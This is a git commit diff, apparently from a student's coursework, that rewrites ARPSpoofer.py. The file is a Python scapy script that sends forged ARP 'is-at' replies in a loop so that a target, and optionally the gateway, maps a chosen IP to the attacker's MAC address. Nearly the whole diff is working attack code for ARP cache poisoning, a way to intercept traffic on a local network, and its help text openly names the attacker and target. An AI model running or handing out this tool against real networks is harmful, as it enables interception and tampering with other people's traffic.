6ccbad3775f97d7bd42b0413b2b434098c28bf4e
nnaiman <nnaiman@g.jct.ac.il>
2020-11-10 16:39:27 +0200

    hjhb

--- ARPSpoofer.py
+++ ARPSpoofer.py
@@ -1,30 +1,30 @@
 from scapy.all import *
-from scapy.layers.inet import IP
-from scapy.layers.l2 import arpcachepoison, Ether, ARP
+from scapy.layers.l2 import arpcachepoison, Ether, ARP, getmacbyip
 import sys
+from time import sleep
 
-#interface, sourceIP, targetIP, delay, gw
-#<editor-fold desc="CheckingArguments">
+# interface, sourceIP, targetIP, delay, gw
+
+# region Arguments
 
 argv = sys.argv
 args = len(argv)
 i = 1
-
-targetIP = '192.168.56.2'        # |
-sourceMAC = "00:00:00:00:00:00"  # | Default values
-interface = conf.iface           # |
-delay = 0                        # |
-gw = False                       # |
-while i < args: #A while loop to iterate on all parameters.
-    if sys.argv[i] in ('-h', '--help'):
+targetIP = ''  #                     |
+sourceIP = gwaddr = conf.route.route('0.0.0.0')[2] # |
+interface = conf.iface  #            | Default values
+delay = 0  #                         |
+gw = False  #                        |
+while i < args or args == 1:  # A while loop to iterate on all parameters.
+    if args == 1 or sys.argv[i] in ('-h', '--help'):
         print("usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET\n\n"
-                "Spoof ARP tables\n\noptional arguments:\n"
-                "-h, --help     show this help message and exit\n"
-                "-i IFACE, --iface IFACE      Interface you wish to use (default is your computer's default)\n"
-                "-s SRC, --src SRC The address you want for the attacker\n"
-                "-d DELAY, --delay DELAY    Delay (in seconds) between messages\n"
-                "-gw        should GW be attacked as well"
-                "-t TARGET, --target TARGET     IP of target")
+              "Spoof ARP tables\n\noptional arguments:\n"
+              "-h, --help     show this help message and exit\n"
+              "-i IFACE, --iface IFACE      Interface you wish to use (default is your computer's default)\n"
+              "-s SRC, --src SRC The address you want for the attacker\n"
+              "-d DELAY, --delay DELAY    Delay (in seconds) between messages\n"
+              "-gw        should GW be attacked as well"
+              "-t TARGET, --target TARGET     IP of target")
         exit(0);
 
     elif argv[i] in ('-i', '--iface'):
@@ -36,7 +36,7 @@ while i < args: #A while loop to iterate on all parameters.
         i += 1
 
     elif argv[i] in ('-s', '--src'):
-        sourceMAC = (sys.argv[i + 1])
+        sourceIP = (sys.argv[i + 1])
         i += 1
 
     elif argv[i] in ('-d', '--delay'):
@@ -49,21 +49,23 @@ while i < args: #A while loop to iterate on all parameters.
     else:
         print("%s isn't an option." % (argv[i]))
     i += 1
+# endregion
 
-#</editor-fold>
 
-def arpcachepoison(source, victim, interval=1):
-    """Poison target's cache with (GW's IP,victim's IP) couple
-arpcachepoison(target, victim, [interval=60]) -> None
-"""
-    tmac="ff:ff:ff:ff:ff:ff"
-    p = Ether(src=sourceMAC,dst=tmac) / ARP(op="is-at", psrc=source, pdst=victim)#sourceMAC=attacker`s MAC, psrc= which IP to update, pdst=where to send reply,
-    # hwsrc = what mac is associated with psrc. hwdst = MAC of pdst
-    try:
-        while True:
-            sendp(p, iface_hint=interface)
-            if conf.verb > 1:
-                os.write(1, b".")
-            time.sleep(interval)
-    except KeyboardInterrupt:
-        pass
+gwaddr = conf.route.route('0.0.0.0')[2]  # Should return the gateway
+
+try:
+    while True:
+        print("Sending packet to target.") # Tell the target that sourceIP is at our MAC
+        p = ARP(op="is-at", psrc=sourceIP, pdst=targetIP, hwsrc=get_if_hwaddr(interface))#make packet
+        send(p, iface=interface)#send attack
+        if gw:
+            print("Sending packet to gateway.") # Tell the source IP that targetIP is at our MAC
+            p = ARP(op="is-at", psrc=sourceIP, pdst=gwaddr, hwsrc=get_if_hwaddr(interface))
+            send(p, iface=interface)
+
+        sleep(int(delay))#delay
+except KeyboardInterrupt:
+    print("\nInterrupted - Finishing.")
+# sourceMAC=attacker`s MAC, psrc= which IP to update, pdst=where to send reply,
+# hwsrc = what mac is associated with psrc. hwdst = MAC of pdst
